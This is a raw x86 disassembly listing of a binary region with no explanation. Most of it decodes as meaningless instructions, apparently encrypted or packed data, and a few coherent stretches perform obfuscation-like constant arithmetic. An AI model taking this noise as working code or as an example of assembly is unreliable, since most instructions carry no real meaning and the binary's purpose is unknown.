  41a487:	cmp    ah,BYTE PTR [ebp-0x2889391a]
  41a48d:	inc    edx
  41a48e:	xor    ebx,DWORD PTR [ecx]
  41a490:	(bad)  
  41a491:	cmp    al,0xa3
  41a493:	(bad)  
  41a494:	in     al,dx
  41a495:	push   cs
  41a496:	jo     0x41a49f
  41a498:	shl    DWORD PTR [ecx],0x87
  41a49b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a49c:	jl     0x41a45d
  41a49e:	(bad)  [edx]
  41a4a0:	pop    edi
  41a4a1:	push   ss
  41a4a2:	and    eax,0x2f07a505
  41a4a7:	dec    ecx
  41a4a8:	sub    eax,0xc083e0d0
  41a4ad:	cmp    ecx,ebp
  41a4af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a4b0:	aas    
  41a4b1:	dec    edx
  41a4b2:	pop    edi
  41a4b3:	inc    esp
  41a4b4:	mov    WORD PTR [ebx-0x6d46e53c],ss
  41a4ba:	cmp    DWORD PTR [eax],esp
  41a4bc:	jp     0x41a45c
  41a4be:	cdq    
  41a4bf:	and    DWORD PTR [ebp-0x11b3f760],0x74738b7
  41a4c9:	repnz mov DWORD PTR [eax-0x77bd6a31],edi
  41a4d0:	and    eax,0x1f3bd2e4
  41a4d5:	sti    
  41a4d6:	imul   ebp
  41a4d8:	or     eax,0xd89d5581
  41a4dd:	stc    
  41a4de:	dec    eax
  41a4df:	out    0x38,eax
  41a4e1:	ins    BYTE PTR es:[edi],dx
  41a4e2:	sub    DWORD PTR [ebp-0x23ad61f6],ecx
  41a4e8:	or     eax,0x7958091c
  41a4ed:	mov    cl,BYTE PTR ds:0xc3acc566
  41a4f3:	cdq    
  41a4f4:	sbb    ecx,esp
  41a4f6:	stos   BYTE PTR es:[edi],al
  41a4f7:	mov    eax,ds:0xd6d9d338
  41a4fc:	sbb    dl,BYTE PTR ds:0x292b86c0
  41a502:	xchg   edx,eax
  41a503:	push   cs
  41a504:	retf   0x78cb
  41a507:	sub    ch,BYTE PTR [ebx-0x32a7109a]
  41a50d:	push   edx
  41a50e:	dec    ebp
  41a50f:	aad    0x90
  41a511:	js     0x41a552
  41a513:	cld    
  41a514:	lods   eax,DWORD PTR ds:[esi]
  41a515:	xor    eax,0x628b5df9
  41a51a:	fistp  WORD PTR [edi]
  41a51c:	(bad)  
  41a51e:	stc    
  41a51f:	mov    esi,0x7634289d
  41a524:	pop    esi
  41a525:	adc    eax,0x68fc588c
  41a52a:	add    al,bl
  41a52c:	aad    0xe4
  41a52e:	mov    ah,0xf0
  41a530:	(bad)  
  41a531:	aad    0x3
  41a533:	rcl    BYTE PTR [ebp+ecx*2+0x42],1
  41a537:	jmp    0x288c:0xca3a5d3e
  41a53e:	xchg   ebp,eax
  41a53f:	je     0x41a4f3
  41a541:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a542:	(bad)  
  41a543:	cli    
  41a544:	out    dx,al
  41a545:	push   ebp
  41a546:	push   esi
  41a547:	dec    BYTE PTR [edi+0x4d]
  41a54a:	lea    esi,[esi]
  41a54c:	xchg   esp,eax
  41a54d:	lahf   
  41a54e:	xchg   BYTE PTR ds:0xb7921215,bh
  41a554:	jp     0x41a5ae
  41a556:	sbb    ah,BYTE PTR [edx-0x4febbcfc]
  41a55c:	xchg   esi,eax
  41a55d:	pop    esp
  41a55e:	or     ch,bl
  41a560:	stos   DWORD PTR es:[edi],eax
  41a561:	push   esi
  41a562:	jno    0x41a58e
  41a564:	xor    al,0xf6
  41a566:	call   0x5e7d8d06
  41a56b:	lods   al,BYTE PTR ds:[esi]
  41a56c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a56d:	call   0x516f:0xbcae0242
  41a574:	not    DWORD PTR [ebp+edi*2+0x5d]
  41a578:	pop    edi
  41a579:	shr    BYTE PTR [edi],1
  41a57b:	sbb    eax,0xc3024d6e
  41a580:	pusha  
  41a581:	jnp    0x41a54d
  41a583:	mov    ecx,0x7b9248f5
  41a588:	call   edx
  41a58a:	cmp    edi,DWORD PTR [eax-0x20b3742c]
  41a590:	lahf   
  41a591:	push   ecx
  41a592:	cli    
  41a593:	shl    DWORD PTR [edi],0xcd
  41a596:	out    dx,eax
  41a597:	lea    esp,[edx-0x32bcd1f6]
  41a59d:	rcr    DWORD PTR [ebx],cl
  41a59f:	sahf   
  41a5a0:	cs repz loope 0x41a5cd
  41a5a4:	fnstenv [ecx+ecx*2]
  41a5a7:	stos   BYTE PTR es:[edi],al
  41a5a8:	pop    esp
  41a5a9:	lds    eax,FWORD PTR [esi]
  41a5ab:	stos   DWORD PTR es:[edi],eax
  41a5ac:	mov    bl,0x1c
  41a5ae:	fst    QWORD PTR [ebp+eax*4+0x66f26d32]
  41a5b5:	sbb    al,0x83
  41a5b7:	out    dx,al
  41a5b8:	xor    al,0x3a
  41a5ba:	sbb    al,0xa2
  41a5bc:	mov    ch,0x9c
  41a5be:	mov    dl,0x53
  41a5c0:	mov    edx,0x1c24548b
  41a5c5:	shrd   ecx,edx,0x2
  41a5c9:	xor    ecx,eax
  41a5cb:	mov    eax,DWORD PTR [esp+0x18]
  41a5cf:	shl    eax,0x1e
  41a5d2:	shr    edx,0x2
  41a5d5:	mov    edx,DWORD PTR [esp+0x1c]
  41a5d9:	xor    eax,eax
  41a5db:	or     eax,ecx
  41a5dd:	mov    ecx,DWORD PTR [esp+0x68]
  41a5e1:	mov    DWORD PTR [ecx],eax
  41a5e3:	mov    eax,DWORD PTR [esp+0x68]
  41a5e7:	mov    ecx,DWORD PTR [esp+0x68]
  41a5eb:	mov    eax,DWORD PTR [eax]
  41a5ed:	cmp    eax,DWORD PTR [ecx]
  41a5ef:	jne    0x41a916
  41a5f5:	mov    eax,DWORD PTR [esp+0x5c]
  41a5f9:	mov    ecx,DWORD PTR [esp+0x5c]
  41a5fd:	mov    eax,DWORD PTR [eax]
  41a5ff:	cmp    eax,DWORD PTR [ecx]
  41a601:	jne    0x41a916
  41a607:	mov    BYTE PTR [esp+0x2c],0x20
  41a60c:	mov    BYTE PTR [esp+0x38],0x3
  41a611:	jmp    0x41a86e
  41a616:	cs lock pop ebp
  41a619:	jne    0x41a5ba
  41a61b:	js     0x41a653
  41a61d:	mov    eax,0x90d3c3ca
  41a622:	je     0x41a5d1
  41a624:	jl     0x41a5b8
  41a626:	jl     0x41a64b
  41a628:	sar    BYTE PTR [esi-0x41413dcb],0x40
  41a62f:	mov    ch,0xb3
  41a631:	fisub  DWORD PTR [eax]
  41a633:	dec    ecx
  41a634:	inc    ebx
  41a635:	sbb    ecx,DWORD PTR [ebx-0x4c6fafde]
  41a63b:	xchg   DWORD PTR [edi+0x27],esi
  41a63e:	in     al,0x51
  41a640:	add    al,0x25
  41a642:	stc    
  41a643:	mov    ebp,0x8b509caf
  41a648:	mov    edx,0x5b384246
  41a64d:	ret    0x6db8
  41a650:	xchg   ebx,eax
  41a651:	jbe    0x41a641
  41a653:	jg     0x41a64f
  41a655:	dec    esi
  41a656:	mov    DWORD PTR [edi+0x26],edi
  41a659:	dec    esi
  41a65a:	xchg   ebx,eax
  41a65b:	fisttp DWORD PTR [edi]
  41a65d:	adc    al,0xfc
  41a65f:	pop    ecx
  41a660:	lods   al,BYTE PTR ds:[esi]
  41a661:	xchg   edi,eax
  41a662:	mov    edx,0x63b1d3b2
  41a667:	push   edi
  41a668:	jb     0x41a6db
  41a66a:	xchg   ebx,eax
  41a66b:	sbb    eax,0xd6795a01
  41a670:	cs repnz inc ebx
  41a673:	push   eax
  41a674:	shl    BYTE PTR [ebp+0xe],cl
  41a677:	pop    ss
  41a678:	int    0xc2
  41a67a:	pop    edx
  41a67b:	data16 sti 
  41a67d:	push   esi
  41a67e:	xchg   esi,eax
  41a67f:	and    ecx,DWORD PTR [edi-0x70]
  41a682:	dec    ebx
  41a683:	push   esp
  41a684:	test   eax,0x31cf8665
  41a689:	jmp    0x74436246
  41a68e:	or     ecx,DWORD PTR [esi-0x2e33c40a]
  41a694:	(bad)  
  41a695:	scas   al,BYTE PTR es:[edi]
  41a696:	iret   
  41a697:	ret    
  41a698:	fnstsw WORD PTR [ebx]
  41a69a:	ret    0x220
  41a69d:	rcl    BYTE PTR [eax-0x3d3040d0],0x5b
  41a6a4:	fidivr DWORD PTR [ebp+eax*8+0x6e]
  41a6a8:	mov    al,ds:0xdbb68e05
  41a6ad:	xor    bh,dh
  41a6af:	(bad)  
  41a6b0:	fdivrp st(6),st
  41a6b2:	lock lods eax,DWORD PTR ds:[esi]
  41a6b4:	adc    BYTE PTR [ebx],bh
  41a6b6:	in     eax,0xeb
  41a6b8:	mov    ds:0xd65b3f44,al
  41a6bd:	pop    ebx
  41a6be:	push   edx
  41a6bf:	dec    edi
  41a6c0:	or     ecx,DWORD PTR [esi]
  41a6c2:	or     ah,bl
  41a6c4:	nop
  41a6c5:	adc    BYTE PTR [ebx-0x55],0xcd
  41a6c9:	push   edi
  41a6ca:	out    dx,al
  41a6cb:	inc    eax
  41a6cc:	adc    al,BYTE PTR ds:0x7e9cb4cd
  41a6d2:	mov    BYTE PTR [eax],bh
  41a6d4:	in     al,0x92
  41a6d6:	xchg   ebx,eax
  41a6d7:	sbb    al,0x5f
  41a6d9:	jno    0x41a6ea
  41a6db:	mov    ah,0x70
  41a6dd:	push   ds
  41a6de:	test   BYTE PTR [eax-0x5485c25c],cl
  41a6e4:	cdq    
  41a6e5:	inc    ebx
  41a6e6:	jmp    0xd0b006
  41a6eb:	pop    ss
  41a6ec:	rdtsc  
  41a6ee:	push   edi
  41a6ef:	loop   0x41a732
  41a6f1:	jmp    0x79b6:0x656b7855
  41a6f8:	xor    al,0x8a
  41a6fa:	inc    edx
  41a6fb:	int    0x9
  41a6fd:	xchg   edi,eax
  41a6fe:	xor    ch,al
  41a700:	mov    ebx,0x438a7066
  41a705:	loopne 0x41a70d
  41a707:	out    dx,eax
  41a708:	dec    ecx
  41a709:	dec    esi
  41a70a:	dec    eax
  41a70b:	fwait
  41a70c:	push   esp
  41a70d:	sub    ebp,0x30d36259
  41a713:	jb     0x41a74b
  41a715:	ficom  DWORD PTR [ecx+0x9380784]
  41a71b:	adc    eax,0x973668ed
  41a720:	inc    ebx
  41a721:	dec    eax
  41a722:	aam    0x21
  41a724:	cdq    
  41a725:	mov    gs,ebx
  41a727:	lea    eax,[ecx+0xe]
  41a72a:	xchg   edi,eax
  41a72b:	adc    al,0x77
  41a72d:	cdq    
  41a72e:	xchg   esi,eax
  41a72f:	int3   
  41a730:	xor    BYTE PTR [ebp+0x7c5bdb44],cl
  41a736:	push   cs
  41a737:	mov    ebx,0xed5365c0
  41a73c:	int3   
  41a73d:	loope  0x41a714
  41a73f:	mov    dh,0xaa
  41a741:	or     bl,dl
  41a743:	iret   
  41a744:	loopne 0x41a701
  41a746:	inc    esp
  41a747:	in     eax,dx
  41a748:	add    DWORD PTR [ecx+0x11],ecx
  41a74b:	jae    0x41a76f
  41a74d:	mov    ss,WORD PTR [esi-0x650d2eed]
  41a753:	(bad)
  41a757:	or     esp,DWORD PTR [ebx-0x5c]
  41a75a:	popf   
  41a75b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a75c:	stc    
  41a75d:	dec    eax
  41a75e:	aaa    
  41a75f:	add    al,0xd2
  41a761:	mov    ds:0x2aaa1bdd,al
  41a766:	add    eax,0xed13bade
  41a76b:	rol    esi,1
  41a76d:	push   ecx
  41a76e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a76f:	stc    
  41a770:	pop    esi
  41a771:	jns    0x41a7b9
  41a773:	mov    ch,0x9
  41a775:	and    al,0xb9
  41a777:	not    BYTE PTR [eax+eax*4-0x82a2e58]
  41a77e:	fwait
  41a77f:	pop    ds
  41a780:	sub    DWORD PTR [edi+edi*4+0x1e],edi
  41a784:	fcmovnu st,st(1)
  41a786:	or     BYTE PTR [edi+eax*2],0xb8
  41a78a:	(bad)
  41a78d:	in     al,0xc4
  41a78f:	mov    eax,ds:0x48caa2f2
  41a794:	inc    ax
  41a796:	std    
  41a797:	pop    ss
  41a798:	sbb    eax,0xeb5a9280
  41a79d:	mov    ds:0xa4d42708,al
  41a7a2:	(bad)  
  41a7a3:	enter  0x4ed5,0x10
  41a7a7:	pop    esp
  41a7a8:	cmp    eax,0x7622f4ec
  41a7ad:	cmp    al,0xd1
  41a7af:	ror    edx,0xb5
  41a7b2:	mov    esp,0xd38e1343
  41a7b7:	mov    dl,0xe5
  41a7b9:	mov    fs,WORD PTR [esi*2-0x4673e968]
  41a7c0:	mov    ecx,0xf0df621a
  41a7c5:	hlt    
  41a7c6:	ins    BYTE PTR es:[edi],dx
  41a7c7:	xchg   edx,eax
  41a7c8:	push   ecx
  41a7c9:	call   0x7ad0:0x6d0284fe
  41a7d0:	and    bh,BYTE PTR [edi+ebp*8]
  41a7d3:	push   0x121be9dd
  41a7d8:	pop    ebp
  41a7d9:	mov    eax,ds:0x55f3e7
  41a7de:	pop    es
  41a7df:	jecxz  0x41a826
  41a7e1:	mov    ah,0x38
  41a7e3:	repnz test BYTE PTR [edx+0x6f85f3a9],cl
  41a7ea:	fsub   DWORD PTR [esi-0x3]
  41a7ed:	or     dh,BYTE PTR [ebx]
  41a7ef:	fisub  WORD PTR [ecx+eiz*4-0x3c]
  41a7f3:	mov    ch,0xf3
  41a7f5:	cmp    dl,BYTE PTR [ebx-0xa600c86]
  41a7fb:	inc    esp
  41a7fc:	jmp    0x3012:0x2440bd7f
  41a803:	pop    esi
  41a804:	(bad)  
  41a805:	sbb    al,0x23
  41a807:	adc    bl,BYTE PTR ds:0xa97c66ee
  41a80d:	jl     0x41a7b9
  41a80f:	jmp    0xb2ea:0x1cb3c36d
  41a816:	mov    bh,0xa0
  41a818:	cmp    esp,DWORD PTR [ebx+0x7a]
  41a81b:	mov    bh,0xd5
  41a81d:	mov    dl,0x19
  41a81f:	adc    bh,ch
  41a821:	xlat   BYTE PTR ds:[ebx]
  41a822:	stc    
  41a823:	mov    edi,0xbd750df2
  41a828:	das    
  41a829:	and    al,0xb9
  41a82b:	sbb    esi,0xbcf78fe2
  41a831:	aad    0x9e
  41a833:	push   edi
  41a834:	repnz cwde 
  41a836:	imul   ebx,edx,0xb937c6
  41a83c:	xor    eax,0x8e7320a7
  41a841:	imul   edi,DWORD PTR [ebx-0x248faa0d],0x28
  41a848:	fs out 0x69,eax
  41a84b:	fmul   QWORD PTR [esi]
  41a84d:	lahf   
  41a84e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a84f:	xor    al,0x56
  41a851:	ins    BYTE PTR es:[edi],dx
  41a852:	or     BYTE PTR [ecx],0x94
  41a855:	int    0xaf
  41a857:	int3   
  41a858:	out    0x32,al
  41a85a:	nop
  41a85b:	sbb    BYTE PTR [ecx+0x18],dl
  41a85e:	int3   
  41a85f:	out    dx,eax
  41a860:	in     al,0xb6
  41a862:	push   0xb6267d14
  41a867:	inc    eax
  41a868:	push   ecx
  41a869:	adc    BYTE PTR [ebp+0x15],bl
  41a86c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a86d:	ffreep st(6)
  41a86f:	inc    esp
  41a870:	and    al,0x3c
  41a872:	ins    DWORD PTR es:[edi],dx
  41a873:	mov    BYTE PTR [esp+0x2b],0x90
  41a878:	mov    al,BYTE PTR [esp+0x2b]
  41a87c:	mov    cl,BYTE PTR [esp+0x3c]
  41a880:	or     al,0xdc
  41a882:	sub    al,cl
  41a884:	mov    cl,BYTE PTR [esp+0x38]
  41a888:	sub    al,0x56
  41a88a:	movzx  eax,al
  41a88d:	movzx  ecx,cl
  41a890:	cdq    
  41a891:	idiv   ecx
  41a893:	movzx  ecx,BYTE PTR [esp+0x2c]
  41a898:	or     eax,ecx
  41a89a:	mov    BYTE PTR [esp+0xc],al
  41a89e:	mov    BYTE PTR [esp+0x24],0x1
  41a8a3:	mov    BYTE PTR [esp+0x2b],0xcf
  41a8a8:	mov    BYTE PTR [esp+0x3c],0x6
  41a8ad:	mov    BYTE PTR [esp+0x38],0x25
  41a8b2:	mov    BYTE PTR [esp+0x2c],0xf8
  41a8b7:	mov    al,BYTE PTR [esp+0x2c]
  41a8bb:	mov    cl,BYTE PTR [esp+0x38]
  41a8bf:	or     al,0xc4
  41a8c1:	and    al,cl
  41a8c3:	mov    cl,BYTE PTR [esp+0x3c]
  41a8c7:	imul   cl
  41a8c9:	mov    cl,BYTE PTR [esp+0x2b]
  41a8cd:	movzx  ecx,cl
  41a8d0:	movzx  eax,al
  41a8d3:	and    eax,ecx
  41a8d5:	mov    cl,BYTE PTR [esp+0x24]
  41a8d9:	movzx  ecx,cl
  41a8dc:	cdq    
  41a8dd:	idiv   ecx
  41a8df:	mov    cl,BYTE PTR [esp+0xc]
  41a8e3:	cmp    cl,al
  41a8e5:	je     0x41a93c
  41a8eb:	lea    eax,[esp+0x9c]
  41a8f2:	push   eax
  41a8f3:	lea    edi,[esp+0x80]
  41a8fa:	call   0x40b68c
  41a8ff:	cmp    eax,ebx
  41a901:	jne    0x41a93c
  41a907:	cmp    edx,esi
  41a909:	jne    0x41a93c
  41a90f:	xor    eax,eax
  41a911:	jmp    0x41b43e
  41a916:	mov    eax,DWORD PTR [esp+0x70]
  41a91a:	mov    ecx,DWORD PTR [esp+0x74]
  41a91e:	mov    edx,DWORD PTR [esp+0x18]
  41a922:	mov    edi,DWORD PTR [esp+0x1c]
  41a926:	add    eax,edx
  41a928:	adc    ecx,edi
  41a92a:	mov    DWORD PTR [esp+0x18],eax
  41a92e:	mov    DWORD PTR [esp+0x1c],ecx
  41a932:	jmp    0x41a93c
  41a937:	mov    ebx,0xcb79b576
  41a93c:	push   0x4
  41a93e:	push   0x422708
  41a943:	lea    eax,[esp+0x6c]
  41a947:	push   eax
  41a948:	call   0x411c08
  41a94d:	mov    eax,DWORD PTR [esp+0x64]
  41a951:	push   0x4
  41a953:	push   DWORD PTR [eax+0x1a4]
  41a959:	lea    eax,[esp+0x74]
  41a95d:	push   eax
  41a95e:	call   0x411c08
  41a963:	mov    eax,DWORD PTR [esp+0x64]
  41a967:	mov    eax,DWORD PTR [eax+0x1a4]
  41a96d:	mov    eax,DWORD PTR [eax]
  41a96f:	mov    ecx,DWORD PTR [esp+0x64]
  41a973:	mov    eax,DWORD PTR [eax+0x3c]
  41a976:	mov    ecx,DWORD PTR [ecx+0x1a4]
  41a97c:	mov    ecx,DWORD PTR [ecx]
  41a97e:	lea    eax,[ecx+eax*1+0x28]
  41a982:	mov    eax,DWORD PTR [eax]
  41a984:	add    DWORD PTR [esp+0x6c],eax
  41a988:	mov    DWORD PTR [esp+0x30],0x127
  41a990:	mov    DWORD PTR [esp+0x10],0x421a
  41a998:	mov    eax,DWORD PTR [esp+0x10]
  41a99c:	jmp    0x41abf9
  41a9a1:	add    BYTE PTR [edx-0x4b9c4ca1],al
  41a9a7:	adc    al,0xb2
  41a9a9:	sub    eax,0xafd15a28
  41a9ae:	lock (bad) 
  41a9b1:	repz sub eax,eax
  41a9b4:	mov    esi,0xbebec235
  41a9b9:	dec    ebp
  41a9ba:	mov    dl,0x35
  41a9bc:	xchg   esp,eax
  41a9bd:	das    
  41a9be:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41a9c0:	adc    al,0x56
  41a9c2:	js     0x41aa20
  41a9c4:	xchg   ebx,eax
  41a9c5:	xor    ah,BYTE PTR ds:0xfe15f911
  41a9cb:	and    ch,BYTE PTR ds:0x376e5fa3
  41a9d1:	out    dx,eax
  41a9d2:	stc    
  41a9d3:	mov    bl,0x33
  41a9d5:	outs   dx,DWORD PTR ds:[esi]
  41a9d6:	mov    ds:0x6446e030,al
  41a9db:	data16 xchg BYTE PTR [edx+0x57],dh
  41a9df:	out    0x71,eax
  41a9e1:	xor    eax,0x4f29a4b2
  41a9e6:	push   ebp
  41a9e7:	adc    BYTE PTR [eax-0x1c23da36],ah
  41a9ed:	cld    
  41a9ee:	dec    ebp
  41a9ef:	stos   BYTE PTR es:[edi],al
  41a9f0:	mov    al,0x84
  41a9f2:	inc    ecx
  41a9f3:	sub    al,0x76
  41a9f5:	xor    ebx,DWORD PTR [eax+0x8]
  41a9f8:	mov    BYTE PTR [eax+0x1e2f97a6],dh
  41a9fe:	in     eax,0xbb
  41aa00:	loopne 0x41a9d3
  41aa02:	stos   DWORD PTR es:[edi],eax
  41aa03:	out    0x5c,al
  41aa05:	inc    ebx
  41aa06:	inc    edi
  41aa07:	pop    edi
  41aa08:	lock in eax,0x9e
  41aa0b:	jmp    0x41aa1f
  41aa0d:	mov    ecx,0x874d7991
  41aa12:	fild   DWORD PTR ds:0x751471ca
  41aa18:	push   edi
  41aa19:	stc    
  41aa1a:	adc    eax,0xdcfbd135
  41aa1f:	sub    eax,DWORD PTR [esi]
  41aa21:	lods   eax,DWORD PTR ds:[esi]
  41aa22:	xchg   DWORD PTR [eax+0x1c457213],ebp
  41aa28:	popf   
  41aa29:	iret   
  41aa2a:	push   ebp
  41aa2b:	ja     0x41aa58
  41aa2d:	xor    al,0x32
  41aa2f:	push   ebp
  41aa30:	xor    eax,0xea74030d
  41aa35:	hlt    
  41aa36:	pushf  
  41aa37:	rcr    DWORD PTR [ebp+0x7ca12a7],0xc4
  41aa3e:	jb     0x41a9e7
  41aa40:	mov    DWORD PTR [esi-0x4d],ebp
  41aa43:	test   bh,dl
  41aa45:	add    eax,0x9e8d5a33
  41aa4a:	sar    esi,cl
  41aa4c:	(bad)  
  41aa4d:	mov    esi,ebx
  41aa4f:	dec    esi
  41aa50:	xor    esp,DWORD PTR [edi-0x2]
  41aa53:	int    0x80
  41aa55:	std    
  41aa56:	mov    edi,0x352738e2
  41aa5b:	cmp    BYTE PTR [ebx-0x53],0x13
  41aa5f:	jecxz  0x41aabc
  41aa61:	test   DWORD PTR [ecx+0x352cb683],edi
  41aa67:	cmp    ebp,eax
  41aa69:	mov    ebp,0xcc263b2b
  41aa6e:	mov    ds:0xa59a6517,al
  41aa73:	call   0xe6d0:0x2490ff09
  41aa7a:	jnp    0x41aad6
  41aa7c:	inc    edi
  41aa7d:	aad    0x8
  41aa7f:	rcl    BYTE PTR [esi+0x541276c4],cl
  41aa85:	loopne 0x41aa59
  41aa87:	dec    ecx
  41aa88:	mov    ebx,0xd199449e
  41aa8d:	add    DWORD PTR [eax],0xd
  41aa90:	(bad)  
  41aa91:	sub    ebx,DWORD PTR [edi]
  41aa93:	fiadd  DWORD PTR [edi+0x22]
  41aa96:	xchg   edx,eax
  41aa97:	adc    cl,BYTE PTR [edx-0x5f8e4299]
  41aa9d:	inc    edi
  41aa9e:	gs dec ebx
  41aaa0:	sbb    eax,0x9352e3d8
  41aaa5:	sbb    BYTE PTR [eax+0x23fb1f0d],dh
  41aaab:	rcr    BYTE PTR [eax-0x2e],0x26
  41aaaf:	add    BYTE PTR [ecx+edx*4-0x542c9d4],0x68
  41aab7:	inc    eax
  41aab8:	mov    edx,0xf5b555f4
  41aabd:	mov    ebx,cs
  41aabf:	into   
  41aac0:	xchg   ebp,eax
  41aac1:	addr16 dec esi
  41aac3:	and    BYTE PTR [ecx],dl
  41aac5:	cs adc ebp,esp
  41aac8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aac9:	dec    eax
  41aaca:	das    
  41aacb:	xchg   esi,eax
  41aacc:	and    ecx,ebx
  41aace:	gs fs dec edx
  41aad1:	sbb    al,0xbe
  41aad3:	cmp    al,0xb9
  41aad5:	gs (bad) 
  41aad7:	cmp    ebx,DWORD PTR [ebp+0x6a6e6cdc]
  41aadd:	xor    esi,DWORD PTR [ecx+0x5]
  41aae0:	test   al,0x9
  41aae2:	add    bl,BYTE PTR [ebx-0x51ffa2be]
  41aae8:	sub    DWORD PTR [eax-0x1d088dac],0xbab6d1aa
  41aaf2:	or     dl,BYTE PTR [ecx]
  41aaf4:	jp     0x41ab14
  41aaf6:	lods   eax,DWORD PTR ds:[esi]
  41aaf7:	mov    al,ds:0x5bd41a47
  41aafc:	test   eax,0xc4cb2301
  41ab01:	add    bl,BYTE PTR [edi-0x729d2ce3]
  41ab07:	push   esp
  41ab08:	std    
  41ab09:	or     eax,0x6d16706b
  41ab0e:	cli    
  41ab0f:	test   eax,0xa5344b9c
  41ab14:	sub    cl,BYTE PTR [esi+0x2b]
  41ab17:	fadd   DWORD PTR [eax-0x6b0b83c7]
  41ab1d:	fs les esi,FWORD PTR es:[edi+eiz*2-0x50]
  41ab23:	stc    
  41ab24:	dec    ebx
  41ab25:	adc    ch,cl
  41ab27:	pop    esi
  41ab28:	jne    0x41ab33
  41ab2a:	sbb    eax,0xd85c8f4
  41ab2f:	mov    ds,WORD PTR [edi+0x56d642e9]
  41ab35:	scas   eax,DWORD PTR es:[edi]
  41ab36:	jle    0x41ab4f
  41ab38:	xchg   edi,eax
  41ab39:	push   0xfffffffc
  41ab3b:	fidiv  WORD PTR [ebx]
  41ab3d:	mov    WORD PTR ds:0x422ee085,ds
  41ab43:	or     al,0x7d
  41ab45:	imul   ecx,DWORD PTR [ecx+0x3de2bf3c],0x35d56ef9
  41ab4f:	jge    0x41aae6
  41ab51:	xchg   ebp,eax
  41ab52:	lahf   
  41ab53:	jo     0x41ab98
  41ab55:	inc    ebp
  41ab56:	add    BYTE PTR ds:0x945dc934,0x80
  41ab5d:	popf   
  41ab5e:	cli    
  41ab5f:	psubb  mm2,mm4
  41ab62:	add    DWORD PTR [ebx+0x19],edx
  41ab65:	rol    eax,0xf
  41ab68:	fiadd  DWORD PTR [edx-0x514c685d]
  41ab6e:	ins    BYTE PTR es:[edi],dx
  41ab6f:	pop    DWORD PTR [ebx]
  41ab71:	pop    esp
  41ab72:	mov    WORD PTR [eax],ss
  41ab74:	int    0xd9
  41ab76:	iret   
  41ab77:	push   ecx
  41ab78:	ins    DWORD PTR es:[edi],dx
  41ab79:	sbb    al,0x82
  41ab7b:	repz (bad) 
  41ab7d:	(bad)  
  41ab7e:	adc    al,0x92
  41ab80:	rol    ebx,cl
  41ab82:	dec    edi
  41ab83:	sub    eax,0xa4b265bc
  41ab88:	jns    0x41ab80
  41ab8a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab8b:	in     al,dx
  41ab8c:	jg     0x41abee
  41ab8e:	dec    edi
  41ab8f:	xchg   edi,eax
  41ab90:	pop    ds
  41ab91:	(bad)  
  41ab92:	mov    edx,0x7a037e3f
  41ab97:	xor    al,0x4
  41ab99:	rcr    BYTE PTR [esi-0x266c4fba],cl
  41ab9f:	xchg   edx,eax
  41aba0:	pop    ds
  41aba1:	not    ch
  41aba3:	pop    ebp
  41aba4:	cs ffree st(1)
  41aba7:	pushf  
  41aba8:	adc    BYTE PTR [ebx+0x30],bl
  41abab:	hlt    
  41abac:	test   BYTE PTR [esi],0x9e
  41abaf:	and    al,0xdb
  41abb1:	shr    BYTE PTR [edi+ebp*1-0x21],1
  41abb5:	sub    DWORD PTR [esi-0x3e5ea0a0],ecx
  41abbb:	fist   DWORD PTR [ecx-0x65]
  41abbe:	xchg   esi,eax
  41abbf:	mov    ebx,0x52b476df
  41abc4:	aad    0x4d
  41abc6:	lock or esi,DWORD PTR [ebp-0x1e1beece]
  41abcd:	jmp    0x41abf0
  41abcf:	pop    esi
  41abd0:	push   ecx
  41abd1:	mov    WORD PTR [ecx],gs
  41abd3:	ret    0xa06b
  41abd6:	lea    eax,[esi-0x62]
  41abd9:	inc    esp
  41abda:	jnp    0x41abc7
  41abdc:	mov    dh,0xd2
  41abde:	mov    ah,0xf5
  41abe0:	(bad)  [eax-0x65efc8dd]
  41abe6:	fild   DWORD PTR [eax]
  41abe8:	ret    0x451a
  41abeb:	dec    ecx
  41abec:	cmp    al,0x61
  41abee:	cs mov edi,0xf89ffed1
  41abf4:	fcom   st(0)
  41abf6:	ror    BYTE PTR [esi-0x3dbbda9f],0xff
  41abfd:	inc    DWORD PTR [ebx]
  41abff:	inc    esp
  41ac00:	and    al,0x30
  41ac02:	and    eax,0xfffffe5a
  41ac07:	jmp    0x41ae64
  41ac0c:	xor    DWORD PTR [edi-0x1f],ebp
  41ac0f:	frstor [esp+esi*2+0x1832b431]
  41ac16:	test   bh,cl
  41ac18:	push   edx
  41ac19:	mov    cl,0x90
  41ac1b:	nop
  41ac1c:	imul   ebp,DWORD PTR ds:0xc235bec0,0xffffffbe
  41ac23:	mov    esi,0xc204a5c7
  41ac28:	mov    DWORD PTR [esi+0x5c],edx
  41ac2b:	jo     0x41abf9
  41ac2d:	test   eax,0x583aedaf
  41ac32:	scas   eax,DWORD PTR es:[edi]
  41ac33:	push   ebx
  41ac34:	sbb    ah,cl
  41ac36:	popa   
  41ac37:	mov    cs,WORD PTR [edi+0x3c0160a0]
  41ac3d:	cs sbb eax,0x502184d2
  41ac43:	repz shl DWORD PTR [eax+0xf14a2c],1
  41ac4a:	enter  0xfa83,0x9c
  41ac4e:	sub    edi,DWORD PTR [ebx+0x59c9090f]
  41ac54:	mov    bl,0xf0
  41ac56:	popa   
  41ac57:	mov    ebp,0x3fa0d488
  41ac5c:	mov    esi,0x767c0401
  41ac61:	xor    al,0xfd
  41ac63:	mov    ecx,0x16cfdba5
  41ac68:	sti    
  41ac69:	xchg   edi,eax
  41ac6a:	pop    ecx
  41ac6b:	dec    DWORD PTR [ebp-0xea362b8]
  41ac71:	xor    DWORD PTR [edx],edi
  41ac73:	sahf   
  41ac74:	jne    0x41ac43
  41ac76:	mov    ebp,0x70a98b52
  41ac7b:	mov    WORD PTR [edi],?
  41ac7d:	rcl    BYTE PTR [ebp+eax*1+0x29e7598b],0xd6
  41ac85:	cmp    DWORD PTR [esi-0x5f],ebp
  41ac88:	ret    
  41ac89:	xchg   ecx,eax
